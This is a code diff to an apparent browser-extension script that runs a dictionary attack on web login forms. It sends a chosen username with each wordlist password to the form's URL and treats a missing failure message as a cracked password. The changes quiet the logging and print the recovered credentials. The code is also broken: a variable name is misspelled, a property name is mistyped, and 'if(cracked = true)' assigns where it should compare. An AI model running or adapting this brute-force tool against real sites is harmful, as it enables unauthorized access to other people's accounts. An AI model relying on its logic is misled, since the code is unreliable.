@@ -6,6 +6,8 @@ var failpattern;
 var crackuser;
 var wordlist;
 var msgHandler = () => {};
+var otherparms = "&";
+var cracked = false;
 
 function handleMessage(msg) {
   msgHandler(msg);
@@ -58,36 +60,45 @@ function cracking_request_listener(e) {
     var un_f;
     var pw_f;
     var badpasserror = failpattern;
+    var iter;
     data.body.forEach(body => {
       if(body.value === "UN") {
         un_f = body.name;
-        console.log("Username Feild: " + un_f);
+      //  console.log("Username Feild: " + un_f);
       }
       if(body.value === "PW") {
         pw_f = body.name;
-        console.log("Pass Feild: " + pw_f);
+      //  console.log("Pass Feild: " + pw_f);
       } else {
         console.log("Other param: " + body.name);
+       otherparams = body.name + "=" + body.valuei + "&" + otherparams;
       }
+      console.log(otherparams);
     });
     console.log(e.originUrl);
     var wordbyline = wordlist.split("\n");
-    for(var iter = 0; iter < wordbyline.length; iter++) {
+    for(iter = 0; iter < wordbyline.length-1; iter++) {
       var xhr = new XMLHttpRequest();
       xhr.open("POST", e.originUrl, true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
-      xhr.onload = function() {
+      xhr.onload  = function crackit(iter) {
         var databack = this.responseText;
         if(databack.length < 5) {
           console.log("Error short page.");
         } else if((databack.match(RegExp(badpasserror), "gi") != null) && (databack.length > 5)) {
-          console.log("Bad password");
+//          console.log("Bad password");
         } else if((databack.match(RegExp(badpasserror), "gi") === null) && (databack.length > 5)) {
-          console.log("Broke");
+        cracked = true;
         }
       }
-      console.log("Trying: " + wordbyline[iter]);
+      if(cracked = true) {
+        console.log("Broke with Username: " + crackuser);
+        console.log("Password: " + wordbyline[iter]);
+        stop_cracking_listener();
+        break;
+      }
+  //    console.log("Trying: " + wordbyline[iter]);
     }
   });
 }
